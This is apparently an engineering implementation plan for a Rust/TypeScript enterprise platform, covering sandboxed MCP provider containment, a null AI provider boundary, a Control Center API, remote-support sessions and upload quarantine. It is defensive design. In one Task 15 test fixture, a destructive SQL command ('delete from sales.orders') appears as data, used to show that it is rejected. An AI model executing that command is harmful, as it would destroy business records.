`V20261025092800__platform_meta_create_provider_manifests.sql` is the single F-57 aggregate owner for provider and MCP persistence. In addition to immutable signed provider manifests/grants/invocation receipts it creates versioned `platform_meta.mcp_connectors`、append-only per-connector `platform_meta.mcp_manifest_versions`、append-only deployment-level `platform_meta.mcp_transport_registry_versions` and RLS-protected `platform_authz.mcp_human_grants` with exact current-slot、source digest、generation、direction/transport、counter/expiry、revocation and row-version CAS constraints. The transport table row stores verified `registry_jcs` and its externally computed `registry_payload_sha256`，unique `(deployment_id,generation)` and one `ACTIVE` current slot；the digest is never embedded in its own preimage. Every connector may independently have one ACTIVE manifest version under its own `(legal_entity_id,connector_id)` slot, so transport singleton and connector plurality cannot overwrite one another. Activation exact-joins the transport row to the current signed generation and rejects listener owner/path/method/protocol/method-set drift；connector activation separately exact-joins its own manifest/digest/grant. No transport process writes these tables: core-server alone resolves all three and passes a verified invocation envelope over authenticated IPC. Restart、concurrent grant consumption/revocation、transport-registry swap、connector-manifest swap、self-digest/cross-table substitution、lost ACK、stale generation、duplicate invocation and two-listener/route-alias attempts are FreshPG tests. `docs/data-dictionary/ai_mcp.md` is atomically rebaselined to these F-57 tables；historical F-55 OpenAPI/table prose cannot act as a second runtime registry.

MCP adds `ClientKind::Mcp` wire `mcp` to the existing six-value foundation enum, producing the F-57 exact seven-value set `win|mac|ios|android|portal|ops|mcp`；F-55 `server_admin` is explicitly absent, and Control Center constructs trusted `Ops`. `/mcp` middleware alone may construct `Mcp` after grant/device/session validation；ordinary `X-Client` cannot submit it and `user_devices` keeps exactly the pre-existing six values without a fake MCP device row. The reconstructed context preserves the grant's real user/session/device/legal-entity bindings；audit accepts exactly those seven values plus `system` (eight total), while metrics use the seven ClientKind values. Migration 92800 updates the audit CHECK/adapter and foundation archcheck in the same release. Missing/forged external `mcp`、reintroduced `server_admin`、an invented device、context mutation after construction or audit/metric/client mismatch are contract negatives.

The two MCP release gates are exact: `RG-MCP-CONFORMANCE-GREEN` proves all six methods、headers、JSON-RPC/error mapping、size/time/frame/state-machine and remote/stdio interoperability；`RG-MCP-CONTAINMENT-GREEN` proves signed manifest/grant、dynamic binding、authz/field/resource intersection、SQL-free gateway、local/Hyper-V containment、credential isolation、audit crash recovery、high-risk denial and Unknown reconciliation. Both are signed Task 14 evidence and Task 23 reruns them against the packaged core-provider set. Config-off or unlicensed MCP leaves `/mcp` nonexistent and permits no outbound/local dispatch while retaining registrations/evidence.

Grant expiry, nonce replay windows, worker/container deadlines, retry backoff and provider timeouts are constructed from Task 2 clocks at the composition root. Persisted evidence stores `TrustedUtc`; in-process enforcement uses monotonic deadlines. No provider, WASM guest, worker or container receives a wall-clock authority claim.

Implement Wasmtime component execution with no preopens/default network, fuel, epoch interruption, memory/table/output limits and only capability-broker host functions. Implement the signed worker carrier with a verified Authenticode executable, restricted token, private named pipe and Windows Job Object limits (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, process count, CPU, memory and wall timeout). Task 24 must compile and execute its real `windows-msvc` containment tests.

Implement `windows-container` against Windows Host Compute Service with Hyper-V isolation, read-only signed image layers, ephemeral writable layer below `ValidatedDataRoot`, no host pipe/device/credential passthrough, explicit egress broker, resource limits, health/drain/delete and orphan cleanup. Activation requires every carrier-specific ADR-0023 host-feature, virtualization/nesting, isolation, capacity and security proof; if any required proof is missing, stale or negative, return `HOST_CAPABILITY_UNAVAILABLE`. The P340 profile defaults it disabled. This is conditional activation, not deferred implementation.

Remove `DbCfg` and the `integ` pool from `apps/integration-gateway/src/config.rs`; a `[db]` section must fail `deny_unknown_fields`. Remove `IntegrationGateway` from `ProcessKind::holds_sql_session` and update its exact-count test. Its only authority connection is authenticated IPC to core-server. The gateway manifest and binary dependency graph must contain no `ep-adapter-db-pg`, SQLx or database URL; its connection-attempt counter remains zero.

- [ ] **Step 4: Run containment and crash tests**

Run: `cargo test -p ep-testkit --test f57_provider_containment --test f57_mcp_protocol --test f57_mcp_containment --test f57_integration_gateway_no_sql --test f57_hyperv_container -- --nocapture`

Expected: PASS for WASM escape attempts, signed-worker crash/resource exhaustion, conditional Hyper-V lifecycle/escape negatives, unknown external outcome, revoked manifest, blocked egress, cross-legal-entity access and zero integration-gateway SQL attempt.

- [ ] **Step 5: Run architecture gates**

Run: `cargo xtask archcheck && cargo test -p ep-platform-provider -p ep-contract-mcp -p ep-platform-mcp -p ep-adapter-wasm -p ep-adapter-windows-worker -p ep-adapter-windows-container -p plugin-host -p integration-gateway -p core-server -p ep-adapter-db-pg && cargo xtask f57check --task F57-14 --phase post-green`

Expected: PASS; `apps/plugin-host` and `apps/integration-gateway` contain no dependency or connection string for `ep-adapter-db-pg`.

- [ ] **Step 6: Commit**

```bash
git add -- crates/platform/provider/Cargo.toml crates/platform/provider/src/lib.rs crates/platform/provider/src/manifest.rs crates/platform/provider/src/grant.rs crates/platform/provider/src/invocation.rs crates/contract/mcp/Cargo.toml
git add -- crates/contract/mcp/src/lib.rs crates/contract/mcp/src/dto.rs crates/contract/mcp/src/port.rs crates/contract/mcp/src/tool.rs crates/contract/mcp/tests/abi.rs crates/contract/mcp/tests/exchange_stream.rs
git add -- crates/platform/mcp/Cargo.toml crates/platform/mcp/src/lib.rs crates/platform/mcp/src/manifest.rs crates/platform/mcp/src/binding.rs crates/platform/mcp/src/grant.rs crates/platform/mcp/src/authorization.rs crates/platform/mcp/src/audit.rs crates/platform/mcp/tests/manifest.rs crates/foundation/src/security/context.rs crates/platform/audit/src/lib.rs
git add -- Cargo.toml crates/adapter/wasm/src/engine.rs crates/adapter/wasm/src/limits.rs crates/adapter/wasm/src/lib.rs
git add -- crates/adapter/wasm/Cargo.toml crates/adapter/windows-worker/Cargo.toml crates/adapter/windows-worker/src/lib.rs crates/adapter/windows-worker/src/job.rs crates/adapter/windows-worker/src/launch.rs crates/adapter/windows-worker/src/verify.rs
git add -- crates/adapter/windows-worker/tests/job_containment.rs crates/adapter/windows-container/Cargo.toml crates/adapter/windows-container/src/lib.rs crates/adapter/windows-container/src/host_probe.rs crates/adapter/windows-container/src/hcs.rs crates/adapter/windows-container/src/lifecycle.rs
git add -- crates/adapter/windows-container/tests/hyperv_containment.rs apps/plugin-host/src/main.rs apps/plugin-host/src/config.rs apps/plugin-host/src/wiring/mod.rs apps/plugin-host/src/mcp.rs apps/plugin-host/Cargo.toml apps/integration-gateway/src/config.rs
git add -- apps/integration-gateway/src/egress.rs apps/integration-gateway/src/main.rs apps/integration-gateway/src/wiring/mod.rs apps/integration-gateway/src/mcp.rs apps/integration-gateway/Cargo.toml Cargo.lock crates/platform/runtime/src/process.rs
git add -- apps/core-server/src/platform/mcp.rs apps/core-server/src/platform/mcp_grants.rs apps/core-server/src/platform/middleware.rs apps/core-server/src/platform/mod.rs apps/core-server/src/wiring/mod.rs apps/core-server/src/lib.rs apps/core-server/src/main.rs apps/core-server/Cargo.toml
git add -- crates/adapter/db-pg/src/platform_meta/provider_manifests.rs crates/adapter/db-pg/src/platform_meta/mcp_connectors.rs crates/adapter/db-pg/src/platform_meta/mcp_transport_registry.rs crates/adapter/db-pg/src/platform_authz/mcp_human_grants.rs crates/adapter/db-pg/src/platform_authz/mod.rs
git add -- crates/adapter/db-pg/src/platform_meta/mod.rs crates/adapter/db-pg/src/platform_audit/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/platform_meta/V20261025092800__platform_meta_create_provider_manifests.sql docs/data-dictionary/ai_mcp.md docs/data-dictionary/platform_audit.md
git add -- testkit/tests/f57_provider_containment.rs testkit/tests/f57_mcp_protocol.rs testkit/tests/f57_mcp_containment.rs testkit/tests/f57_integration_gateway_no_sql.rs testkit/tests/f57_hyperv_container.rs testkit/Cargo.toml
git commit -m "feat: add governed provider and mcp host"
```

### Task 15: Freeze the AI provider boundary with a null implementation only

**Files:**
- Create: `crates/platform/ai/Cargo.toml`
- Create: `crates/platform/ai/src/lib.rs`
- Create: `crates/platform/ai/src/provider.rs`
- Create: `crates/platform/ai/src/policy.rs`
- Create: `crates/platform/ai/src/null.rs`
- Create: `crates/platform/ai/tests/authority_boundary.rs`
- Modify: `Cargo.toml`
- Modify: `apps/core-server/src/wiring/mod.rs`
- Modify: `apps/job-worker/src/wiring/mod.rs`
- Modify: `apps/core-server/Cargo.toml`
- Modify: `apps/job-worker/Cargo.toml`
- Modify: `xtask/src/f57check.rs`
- Create: `testkit/tests/f57_ai_optional.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 8 authorization, Task 12 durable effects and Task 14 provider/tool contracts.
- Produces: `AiProvider`, `AiRequestEnvelope`, `AiProposal`, `AiExecutionPolicy` and `NullAiProvider`; there is no model runner, model migration or downloadable model in this wave.

- [ ] **Step 1: Write failing optionality and non-authority tests**

```rust
#[tokio::test]
async fn deterministic_contract_activation_succeeds_with_null_ai() {
    let system = synthetic_command_fixture().with_ai(NullAiProvider);
    let result = system.execute_deterministic_fixture().await.unwrap();
    assert_eq!(result.authoritative_facts, 1);
    assert_eq!(result.ai_calls, 0);
}

#[test]
fn ai_proposal_cannot_carry_sql_or_untyped_side_effect() {
    let input = json!({"summary":"ok","sql":"delete from sales.orders"});
    assert!(matches!(AiProposal::parse(input), Err(AiError::UnknownField("sql"))));
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-15 --phase pre-red && cargo test -p ep-platform-ai --test authority_boundary`

Expected: FAIL because the AI boundary crate is absent.

- [ ] **Step 3: Implement the narrow provider contract**

```rust
#[async_trait::async_trait]
pub trait AiProvider: Send + Sync {
    async fn propose(&self, request: AiRequestEnvelope) -> Result<AiProposal, AiError>;
}

pub struct AiRequestEnvelope {
    pub purpose: AiPurpose,
    pub maximum_security_level: SecurityLevel,
    pub allowed_tools: Vec<McpToolId>,
    pub redacted_context: serde_json::Value,
    pub prompt_version: String,
    pub generation: GenerationId,
}

pub struct AiProposal {
    pub narrative: String,
    pub suggested_tool_calls: Vec<TypedToolCall>,
    pub confidence_basis: Vec<EvidenceRef>,
}
```

`NullAiProvider` returns `AiError::Unavailable` without changing business state. The policy rejects highest-classification external requests, requires explicit tool grants and routes accepted tool calls back through Task 14. The deterministic test is a synthetic Task 6 handler and does not claim real contract activation before Task 19. Add an F-57 checker rule that fails if `ai-inferer`, a model binary or migration `20261024090000` enters the current release manifest.

- [ ] **Step 4: Run optionality and authority tests**

Run: `cargo test -p ep-platform-ai -p core-server -p job-worker && cargo test -p ep-testkit --test f57_ai_optional && cargo xtask f57check --task F57-15 --phase post-green`

Expected: PASS; every deterministic business scenario completes with `NullAiProvider`, and no local model artifact is part of the current release.

- [ ] **Step 5: Commit**

```bash
git add -- crates/platform/ai/Cargo.toml crates/platform/ai/src/lib.rs crates/platform/ai/src/provider.rs crates/platform/ai/src/policy.rs crates/platform/ai/src/null.rs crates/platform/ai/tests/authority_boundary.rs
git add -- Cargo.toml apps/core-server/src/wiring/mod.rs apps/job-worker/src/wiring/mod.rs apps/core-server/Cargo.toml apps/job-worker/Cargo.toml xtask/src/f57check.rs
git add -- testkit/tests/f57_ai_optional.rs testkit/Cargo.toml
git commit -m "feat: freeze optional ai provider boundary"
```

### Task 16: Build the server-resident Control Center

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-client-lifecycle-security-contract.md`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Create: `docs/openapi/control-center.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Create: `clients/control-center/package.json`
- Create: `clients/control-center/package-lock.json`
- Create: `clients/control-center/tsconfig.json`
- Create: `clients/control-center/index.html`
- Create: `clients/control-center/vite.config.ts`
- Create: `clients/control-center/vitest.config.ts`
- Create: `clients/control-center/src/test/setup.ts`
- Create: `clients/control-center/src/main.tsx`
- Create: `clients/control-center/src/app/App.tsx`
- Create: `clients/control-center/src/api/authority.ts`
- Create: `clients/control-center/src/features/generations/GenerationReview.tsx`
- Create: `clients/control-center/src/features/packages/PackageLifecycle.tsx`
- Create: `clients/control-center/src/features/permissions/GrantSimulator.tsx`
- Create: `clients/control-center/src/features/automations/IncidentDesk.tsx`
- Create: `clients/control-center/src/features/operations/ProductionEvidence.tsx`
- Create: `clients/control-center/src/app/App.test.tsx`
- Modify: `apps/core-server/src/platform/mod.rs`
- Create: `apps/core-server/build.rs`
- Create: `apps/core-server/src/platform/static_assets.rs`
- Create: `apps/core-server/src/platform/control_center.rs`
- Create: `apps/core-server/src/platform/generations.rs`
- Create: `apps/core-server/src/platform/packages.rs`
- Create: `apps/core-server/src/platform/capabilities.rs`
- Create: `apps/core-server/src/platform/automations.rs`
- Create: `apps/core-server/src/platform/storage.rs`
- Create: `apps/core-server/src/platform/remote_support.rs`
- Create: `crates/platform/flow/src/support_session.rs`
- Modify: `crates/platform/flow/src/lib.rs`
- Modify: `crates/platform/flow/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_ops/support_sessions.rs`
- Modify: `crates/adapter/db-pg/src/platform_ops/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `crates/foundation/src/port/malware.rs`
- Modify: `crates/foundation/src/port/mod.rs`
- Modify: `crates/foundation/src/lib.rs`
- Modify: `crates/adapter/file/src/lib.rs`
- Create: `crates/adapter/file/src/quarantine.rs`
- Create: `crates/adapter/file/src/scanner.rs`
- Create: `crates/adapter/file/src/publisher.rs`
- Modify: `crates/adapter/file/Cargo.toml`
- Create: `crates/adapter/windows-malware/Cargo.toml`
- Create: `crates/adapter/windows-malware/src/lib.rs`
- Create: `crates/adapter/windows-malware/src/defender.rs`
- Create: `crates/adapter/windows-malware/src/amsi.rs`
- Create: `crates/adapter/windows-malware/tests/verdict.rs`
- Modify: `crates/platform/file/src/scan.rs`
- Create: `crates/platform/file/src/scanner.rs`
- Create: `crates/platform/file/src/intake_lifecycle.rs`
- Modify: `crates/platform/file/src/upload.rs`
- Modify: `crates/platform/file/src/lib.rs`
- Modify: `crates/platform/file/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_file/mod.rs`
- Create: `crates/adapter/db-pg/src/platform_file/objects.rs`
- Create: `crates/adapter/db-pg/src/platform_file/intake.rs`
- Modify: `apps/core-server/src/lib.rs`
- Modify: `apps/core-server/src/main.rs`
- Modify: `apps/core-server/Cargo.toml`
- Create: `db/migrations/platform_meta/V20261025092900__platform_meta_create_ui_schema_versions.sql`
- Create: `db/migrations/platform_file/V20261025092910__platform_file_create_upload_quarantine_and_scan_evidence.sql`
- Create: `db/migrations/platform_ops/V20261025092920__platform_ops_create_support_sessions.sql`
- Modify: `docs/data-dictionary/platform_flow.md`
- Modify: `docs/event-catalog.md`
- Modify: `docs/metrics-catalog.md`
- Create: `xtask/src/scan_web_assets.rs`
- Modify: `xtask/src/main.rs`
- Create: `testkit/tests/f57_control_center_security.rs`
- Create: `testkit/tests/f57_remote_support.rs`
- Create: `testkit/tests/f57_control_center_contract.rs`
- Create: `testkit/tests/f57_file_quarantine.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Tasks 2–15 authority APIs/evidence and the immutable API discriminator、component-shape、component-state/state-domain and direct-route seeds; the browser is only a view/controller for Task 6 commands.
- Produces: the exact `docs/openapi/control-center.v1.yaml` machine contract for versioned `/control/v1/*` command/query routes, signed UI schema review, package/generation approval, permission simulation, automation incident resolution, remote-support session lifecycle and production-evidence dashboards.

- [ ] **Step 1: Write failing browser and server-boundary tests**

```rust
#[tokio::test]
async fn remote_control_page_cannot_supply_actor_or_policy_version() {
    let response = post_control_command(json!({
        "command": "generation.activate",
        "actor_id": "forged",
        "policy_version": 1
    })).await;
    assert_eq!(response.status(), 400);
    assert_eq!(response.error_code(), "PLATFORM.CONTROL.UNEXPECTED_AUTHORITY_FIELD");
}

#[tokio::test]
async fn generation_activation_requires_reauth_and_distinct_approver() {
    let response = activate_as_same_author_and_approver().await;
    assert_eq!(response.error_code(), "PLATFORM.AUTHZ.SOD_VIOLATION");
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-16 --phase pre-red && cargo test -p ep-testkit --test f57_control_center_security`

Expected: FAIL because Control Center routes do not exist.

- [ ] **Step 3: Implement the server command surface**

```rust
pub struct ControlCommand<T> {
    pub request_id: uuid::Uuid,
    pub expected_generation: GenerationId,
    pub idempotency_key: String,
    pub payload: T,
}

pub struct ControlResult<T> {
    pub correlation_id: uuid::Uuid,
    pub authoritative_generation: GenerationId,
    pub audit_entry_id: uuid::Uuid,
    pub value: T,
}
```

Actor, device, legal entity, re-auth and policy version come only from the authenticated server context. Use same-site secure cookies, anti-CSRF tokens, strict CSP, no local customer-content storage and no service-worker offline mode. Serve the compiled static UI from the authority node; a remote URL is not a fifth client or separate control plane.

`docs/openapi/control-center.v1.yaml` is the sole Control Center HTTP IDL and must declare exact `info.title: Enterprise Platform Control Center API`、`info.version: 1.0.0-f57`、`x-f57-status: CURRENT`、`x-source-authority: F57_TASK_16`、`x-planned-implementation-tasks: [F57-16]` and `x-implementation-state: IMPLEMENTED`; Task 16 atomically updates its `docs/openapi/README.md` row and the authority register from `PLANNED_CREATE` to `CURRENT/IMPLEMENTED`, and removes no historical row. Its exact method/path/operationId set is the following 12 rows；method、case、template name、尾斜杠和 operationId 均逐字比较：

| method | path | operationId |
|---|---|---|
| `POST` | `/control/v1/session/start` | `startControlSession` |
| `POST` | `/control/v1/session/reauth` | `reauthenticateControlSession` |
| `POST` | `/control/v1/session/end` | `endControlSession` |
| `POST` | `/control/v1/commands` | `submitControlCommand` |
| `GET` | `/control/v1/commands/{request_id}` | `getControlCommandReceipt` |
| `POST` | `/control/v1/queries` | `executeControlQuery` |
| `GET` | `/control/v1/events/stream` | `streamControlEvents` |
| `POST` | `/control/v1/files/upload-sessions` | `createControlFileUploadSession` |
| `GET` | `/control/v1/files/upload-sessions/{upload_id}` | `getControlFileUploadSession` |
| `PUT` | `/control/v1/files/upload-sessions/{upload_id}/chunks/{chunk_no}` | `putControlFileUploadChunk` |
| `POST` | `/control/v1/files/upload-sessions/{upload_id}/complete` | `completeControlFileUploadSession` |
| `GET` | `/control/v1/files/{object_id}/versions/{version_id}` | `getControlFileVersion` |

Adding a second verb on a listed path, a bare-latest file path, generic object/table proxy, GraphQL endpoint, arbitrary RPC method or database passthrough is forbidden. `f57_control_center_contract` exact-compares all 12 triples and rejects an extra/missing verb, alias, trailing slash or operationId drift. The OpenAPI schemas freeze `ControlCommandV1` as exact `{request_id,expected_generation,idempotency_key,command_type,payload}`、`ControlQueryV1` as exact `{request_id,query_type,generation,payload}`、`ControlResultV1<T>` as exact `{correlation_id,authoritative_generation,audit_entry_id,value}` and the stable error envelope as exact `{correlation_id,error_code,message_key,retryable,field_errors,authoritative_generation}`. Every object has `additionalProperties:false`; command/query registries use discriminated `oneOf` whose variants carry `x-f57-owner-task`; file routes use bounded opaque upload handles, completion returns the Task 1 exact `FileIngressAcceptedV1` immediately after durable QUARANTINED acceptance, and only the later `UploadSessionStatusV1` PUBLISHED branch contains exact `PublishedAttachmentRefV1={object_id,version_id}`. Control Center polls the row's status path with `Retry-After` plus capped exponential backoff/jitter and never blocks completion on scan. Cursors and events contain no authority fact, and actor/device/legal-entity/policy/SoD/MFA fields are never accepted from JSON. Same-site session cookie plus per-request CSRF proof is mandatory on every mutating route；401/403/409/422/429 and stable F-57 error codes are contract-tested without object-existence, SQL, path or stack disclosure.

Task 16 consumes the two machine authorities `docs/f57-api-discriminators.seed.tsv` and `docs/f57-api-component-shapes.seed.tsv`: its complete introduced slice is exactly the 20 `CONTROL/COMMAND` plus 17 `CONTROL/QUERY` rows whose `owner_task=F57-16` and `introduced_version=1.0.0-f57`, plus every distinct payload/result shape row owned by F57-16. The OpenAPI version is exactly `1.0.0-f57` and `x-planned-implementation-tasks` is exactly `[F57-16]`. OpenAPI `oneOf` branches/extensions, Task 6 Rust registrations, generated Control Center TypeScript union and canonical JSON Schemas must equal those seed slices field-for-field and contain no other row. The former hand-selected inline matrix is intentionally removed because a partial second registry cannot be authoritative.

The four generation mutations whose discriminator mode is `CONTROL_PAYLOAD_CAS` are uniquely shaped as `GenerationSubmitRequestV1={generation_id,expected_row_version,evidence_refs}`、`GenerationApprovalRequestV1={generation_id,expected_row_version,decision,evidence_refs}`、`GenerationActivateRequestV1={generation_id,expected_row_version}` and `GenerationRollbackRequestV1={target_generation_id,expected_row_version,reason,evidence_refs}`. `expected_generation` remains only the command-envelope generation fence；it never substitutes for, duplicates or weakens the subject's positive `expected_row_version`.

The strict component fields here are a human-readable exact projection of the component seed, never a second authority: `GenerationApprovalRequestV1={generation_id,expected_row_version,decision,evidence_refs}` with `decision=APPROVE|REJECT`; `GenerationActivateRequestV1={generation_id,expected_row_version}`; `GenerationRollbackRequestV1={target_generation_id,expected_row_version,reason,evidence_refs}`; `PackageInstallRequestV1={published_attachment_ref,package_sha256}`; `PackageTransitionRequestV1={package_id,expected_row_version,reason,evidence_refs}`; `PackageUpgradeRequestV1={package_id,expected_row_version,published_attachment_ref,package_sha256}`; `PackageRollbackRequestV1={package_id,expected_row_version,target_package_version,reason,evidence_refs}`; `SupportSessionCreateRequestV1={ticket_id,support_principal_id,authenticated_origin,object_codes,field_codes,action_codes,requested_duration_seconds,reason,evidence_refs}`; `SupportSessionTransitionRequestV1={support_session_id,expected_row_version,reason,evidence_refs}`; `SupportSessionCloseRequestV1={support_session_id,expected_row_version,credential_revocation_evidence_ref,sealed_evidence_ref}`; `ControlObjectIdQueryV1={id}`; `ControlListQueryV1={states,page_size,cursor}`; `PermissionSimulationRequestV1={action_code,object_ref,proposed_context_digest}` and `ProductionEvidenceQueryV1={evidence_kinds,as_of_generation}`. `GenerationChangedV1={generation_id,state,row_version,generation_digest}`、`PackageChangedV1={package_id,state,row_version,package_manifest_digest}` and `SupportSessionChangedV1={support_session_id,state,row_version,expires_at}`。Arrays are sorted/unique, `page_size=1..200`, durations are `1..14400`, all hashes are lowerhex SHA-256, and optional values are present as JSON null. Every other seed-named payload/result component uses the exact Task 1 closed profile expansion; the owner contract type must exact-join it and may not invent an API-only field or generic `data|attributes|metadata` map. Any prose/seed mismatch fails before code generation and the seed wins. Error components compose under the Task 1 deterministic surface/kind rule and add only the seed row's non-`NONE` `operation_error_code`; all Task 16 rows are `NONE`. Unknown/default variants fail generation.

Remote support is a current governed feature, never a standing tunnel. `crates/platform/flow::SupportSessionStore` is the lifecycle/port owner；`platform_ops.support_sessions` and its append-only transition/evidence tables are the only persistence truth，while `apps/core-server/src/platform/remote_support.rs` is only transport/orchestration. Store methods `create/transition/append_evidence/finalize_cleanup` all accept caller-owned `PgTx` plus `expected_row_version` so state, credential-ref rotation, audit and outbox commit together. Ephemeral secret bytes are never stored；only credential ref/digest/epoch/rotated-at and sealed evidence refs are durable.

Implement the exact SupportSession state graph from the client/lifecycle/security contract: `REQUESTED→APPROVED|REVOKED|EXPIRED|FAILED_CONTAINED`、`APPROVED→READY|REVOKED|EXPIRED|FAILED_CONTAINED`、`READY→ACTIVE|REVOKED|EXPIRED|FAILED_CONTAINED`、`ACTIVE→CLOSED|REVOKED|EXPIRED|FAILED_CONTAINED`，with all four terminals immutable. Every allowed edge must execute and every unlisted/terminal edge must fail under SQL and domain tests. Each session binds named support personnel, customer approver, ticket, authenticated origin, object/field/action allowlists and a default one-hour, signed-policy absolute maximum four-hour trusted/monotonic deadline；activation requires MFA and applicable SoD. `ACTIVE→CLOSED` is permitted only in the same transaction that proves credential revoked and evidence sealed；otherwise the sole terminal is FAILED_CONTAINED. Expiry, revocation, permission loss or disconnect closes access, rotates/revokes ephemeral credentials and preserves immutable redacted evidence；a cleanup/evidence failure enters `FAILED_CONTAINED`, blocks reuse and writes exact durable `SupportSessionFailedContainedV1` outbox fact for Task 24 incident intake. Restart at every state, cleanup crash, concurrent approve/revoke, stale row version and terminal mutation are mandatory FreshPG negatives. Default network policy remains zero-outbound and permanent agents/listeners, shared credentials and vendor backdoors are rejected by tests.

Freeze the missing READY producer explicitly. Approval only executes `REQUESTED→APPROVED`；it never provisions transport. A restricted provisioner consumes internal `PrepareSupportTransportV1={support_session_id,expected_row_version,approved_scope_digest,credential_policy_digest,network_policy_digest}` and, after creating then independently reading back the one-time credential、expiry/epoch、customer-controlled network origin/destination、scope and negative reachability to database/KMS/backup control planes, appends `SupportTransportPreparedV1={support_session_id,transport_kind,credential_ref_digest,credential_epoch,network_readback_digest,scope_digest,expires_at,row_version}` in the same CAS transaction as `APPROVED→READY`. Secret bytes never enter the fact. Any create/readback/persist/compensating-revoke failure goes to FAILED_CONTAINED with `SupportTransportPreparationFailedV1={support_session_id,failure_code,cleanup_outcome,evidence_ref,row_version}`. Activation accepts only READY and rechecks the prepared fact；same command identity cannot issue a second credential. These internal types use Task 6 command/outbox/audit paths and add no Control HTTP discriminator. Tests cover approve-without-ready, activate-from-approved, partial provisioning crash, duplicate delivery, stale readback, cleanup failure and successful READY→ACTIVE.

Task 16 also activates the minimum secure attachment chain before exposing any file route. `AttachmentVersionState` is the closed graph `QUARANTINED→SCAN_CLEAN|REJECTED`、`SCAN_CLEAN→PUBLISH_PREPARED|REJECTED`、`PUBLISH_PREPARED→PUBLISHED`，with PUBLISHED/REJECTED terminal and every unlisted edge rejected. SKIPPED、UNAVAILABLE、TIMEOUT、UNKNOWN、definitions older than 72 hours or any unverified provider result leaves the immutable version QUARANTINED and never acts as CLEAN. The durable journal protocol is: write/fsync same-volume quarantine bytes；scan the exact digest and append evidence；transactionally CAS SCAN_CLEAN；write/fsync final staging bytes；transactionally CAS PUBLISH_PREPARED with final identity/digest；atomic same-volume rename and directory flush；transactionally CAS PUBLISHED. Recovery inspects DB state plus final handles and deterministically resumes the next step；a missing/mismatched byte object becomes REJECTED plus incident, never guessed PUBLISHED. Reads and business-link commands accept only exact `{legal_entity_id,object_id,version_id}` whose DB row is PUBLISHED, current clean evidence is bound to the immutable digest and final-handle readback matches. Cross-legal-entity, bare object/latest ID, QUARANTINED, stale scan, replaced version and a crash at every DB/file boundary are tested. Task 23 may extend holds/disposition/OCR/import, but cannot postpone or weaken this publication gate.

The UI schema is a canonical `UI_SCHEMA` generation item: its exact bytes/digest are referenced by `GenerationItemV1` and `ui_schema_set_digest`, while the enclosing generation is `SignedBusinessArtifactV1<SignedGenerationPayloadV1>`；there is no separate `signing_key_id`/algorithm/raw-signature grammar. `apps/core-server/build.rs` consumes only `clients/control-center/dist`; the build fails if assets were not produced by `npm ci && npm run build`. Cross-platform `cargo xtask scan-web-assets clients/control-center/dist` rejects source maps, database URLs, tokens/private keys and customer fixture values. Bind every traceability row owned by Task 16 to its exact `T-F57-*` DOM TestID from `docs/generated/f57-task-manifest.tsv`; no hand-written wildcard TestID list is accepted.

- [ ] **Step 4: Implement and test the non-technical UI surfaces**

```tsx
it("always shows actual, desired, degraded and evidence states", async () => {
  render(<App api={fixtureApi({ desired: 8, observed: 7, deploymentState: "SINGLE_DISK_DEGRADED_PRODUCTION" })} />);
  expect(await screen.findByText("期望配置代 8")) .toBeVisible();
  expect(screen.getByText("实际配置代 7")).toBeVisible();
  expect(screen.getByText("单磁盘降级生产")).toBeVisible();
});
```

Run: `npm --prefix clients/control-center ci && npm --prefix clients/control-center test -- --run`

Expected: PASS for keyboard navigation, WCAG AA semantics, approval preview, failure explanation, stale-generation refresh and permanent degraded-state display.

- [ ] **Step 5: Run security and build gates**

Run: `npm --prefix clients/control-center ci && npm --prefix clients/control-center test -- --run && npm --prefix clients/control-center run build && cargo xtask scan-web-assets clients/control-center/dist && cargo test -p core-server -p ep-platform-flow -p ep-platform-file -p ep-adapter-file -p ep-adapter-windows-malware -p ep-adapter-db-pg && cargo test -p ep-testkit --test f57_control_center_security --test f57_remote_support --test f57_control_center_contract --test f57_file_quarantine && cargo xtask f57check --task F57-16 --phase post-green`

Expected: PASS; built assets contain no secret, customer content, source map or database endpoint.

- [ ] **Step 6: Commit**

```bash
git add -- docs/openapi/control-center.v1.yaml docs/openapi/README.md docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md
git add -- clients/control-center/package.json clients/control-center/package-lock.json clients/control-center/tsconfig.json clients/control-center/index.html clients/control-center/vite.config.ts clients/control-center/vitest.config.ts
git add -- clients/control-center/src/test/setup.ts clients/control-center/src/main.tsx clients/control-center/src/app/App.tsx clients/control-center/src/api/authority.ts clients/control-center/src/features/generations/GenerationReview.tsx clients/control-center/src/features/packages/PackageLifecycle.tsx
git add -- clients/control-center/src/features/permissions/GrantSimulator.tsx clients/control-center/src/features/automations/IncidentDesk.tsx clients/control-center/src/features/operations/ProductionEvidence.tsx clients/control-center/src/app/App.test.tsx apps/core-server/src/platform/mod.rs apps/core-server/build.rs
git add -- apps/core-server/src/platform/static_assets.rs apps/core-server/src/platform/control_center.rs apps/core-server/src/platform/generations.rs apps/core-server/src/platform/packages.rs apps/core-server/src/platform/capabilities.rs apps/core-server/src/platform/automations.rs
git add -- apps/core-server/src/platform/storage.rs apps/core-server/src/platform/remote_support.rs apps/core-server/src/lib.rs apps/core-server/src/main.rs apps/core-server/Cargo.toml db/migrations/platform_meta/V20261025092900__platform_meta_create_ui_schema_versions.sql
